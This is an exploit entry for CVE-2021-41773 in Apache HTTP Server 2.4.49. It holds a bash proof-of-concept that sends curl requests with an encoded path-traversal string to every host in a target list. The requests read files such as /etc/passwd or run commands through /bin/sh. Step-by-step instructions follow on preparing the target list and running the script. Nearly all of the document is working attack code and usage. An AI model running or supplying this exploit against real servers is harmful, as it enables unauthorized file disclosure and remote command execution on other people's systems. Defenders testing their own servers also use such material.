# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami


Instruction:

Preparation

Ensure Environment Setup:
Make sure you have curl installed on your system. It is generally available by default on most Unix-like systems.
Prepare a file named targets.txt containing the URLs of the target servers, one per line.

Copy the provided script into a file named PoC.sh.

Make the script executable: chmod +x PoC.sh

Create a text file named targets.txt and list the URLs of the Apache servers you want to test. 
http://192.168.1.10
http://example.com

Execute the script with the necessary parameters:
TARGET-LIST.TXT: The file containing the list of target URLs.
PATH: The path to test, such as /etc/passwd for Unix-based systems.
COMMAND: The command to execute. For example, whoami to check the user.

command to list /etc/passwd
./PoC.sh targets.txt /etc/passwd

 command to execute whoami:
./PoC.sh targets.txt /bin/sh whoami


The script will output the results directly to your terminal.


